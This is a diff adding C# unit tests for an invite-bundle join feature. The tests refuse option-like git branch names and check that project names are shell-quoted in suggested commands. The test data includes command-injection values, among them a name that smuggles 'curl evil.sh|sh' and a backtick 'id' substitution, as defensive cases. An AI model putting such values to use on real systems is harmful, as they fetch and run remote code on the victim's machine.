@@ -100,6 +100,14 @@ public sealed class SolutionInviteJoinTests
         ((Action)(() => SolutionInviteBundle.Parse(empty.Encode()))).Should().Throw<DomainValidationException>().WithMessage("*at least one project*");
     }
 
+    [Fact]
+    public void A_bundle_member_whose_base_branch_git_would_read_as_an_option_is_refused()
+    {
+        SolutionInviteBundle hostile = new(SolutionDecider.NewKey(), "storefront", [new SolutionInviteMember(Api, "s", "--orphan")]);
+
+        ((Action)(() => SolutionInviteBundle.Parse(hostile.Encode()))).Should().Throw<DomainValidationException>().WithMessage("*'shop-api'*base branch*");
+    }
+
     // ---- the per-member plan ----
 
     [Fact]
@@ -113,6 +121,22 @@ public sealed class SolutionInviteJoinTests
         plan.Select(step => step.Action).Should().Equal(SolutionJoinAction.Register, SolutionJoinAction.Join);
         plan[0].Local.Should().BeNull();
         plan[1].Local.Should().BeSameAs(unjoinedWeb, "an unjoined project has no key yet, so the repository URL (host, path and case aside) finds it");
+    }
+
+    [Fact]
+    public void A_project_registered_from_a_path_alone_is_found_by_its_repositorys_origin_not_registered_a_second_time_or_called_a_collision()
+    {
+        ProjectDetails pathOnly = Project("shop-web", key: null, url: null, joined: false);
+        ProjectDetails renamed = Project("api", key: null, url: null, joined: false);
+        Func<ProjectDetails, Uri?> originOf = project => project == pathOnly
+            ? new Uri("ssh://git@github.com/acme/shop-web.git")
+            : project == renamed ? Api.RepositoryUrl : null;
+
+        IReadOnlyList<SolutionJoinStep> plan = SolutionJoinPlanner.Plan(Bundle(Web, Api), [pathOnly, renamed], RootOf, originOf);
+
+        plan.Select(step => step.Action).Should().Equal(SolutionJoinAction.Join, SolutionJoinAction.Join);
+        plan[0].Local.Should().BeSameAs(pathOnly, "a same-name project with no recorded URL is the member, not a collision");
+        plan[1].Local.Should().BeSameAs(renamed, "a differently named one is the member too, not a reason to register a duplicate");
     }
 
     [Fact]
@@ -199,7 +223,18 @@ public sealed class SolutionInviteJoinTests
         outcomes[0].HandCommand.Should().StartWith("h9k project rename shop-api <new-name>, then h9k solution join --invite -");
         outcomes[1].Reason.Should().Be("secret already spent");
         outcomes[1].HandCommand.Should().Be(SolutionJoinHandCommands.Retry());
-        SolutionJoinHandCommands.InitThenRetry("web checkout").Should().StartWith("h9k project init \"web checkout\", then h9k solution join --invite -");
+        SolutionJoinHandCommands.InitThenRetry("web checkout").Should().StartWith("h9k project init 'web checkout', then h9k solution join --invite -");
+    }
+
+    [Theory]
+    [InlineData("x$(curl${IFS}evil.sh|sh)", "'x$(curl${IFS}evil.sh|sh)'")]
+    [InlineData("`id`", "'`id`'")]
+    [InlineData("it's", "'it'\\''s'")]
+    [InlineData("shop-api_2.0", "shop-api_2.0")]
+    public void A_project_name_from_the_bundle_reaches_a_hand_command_single_quoted_unless_it_is_plainly_safe(string name, string quoted)
+    {
+        SolutionJoinHandCommands.InitThenRetry(name).Should().StartWith($"h9k project init {quoted}, then ");
+        SolutionJoinHandCommands.RenameThenRetry(name).Should().StartWith($"h9k project rename {quoted} <new-name>, then ");
     }
 
     [Fact]
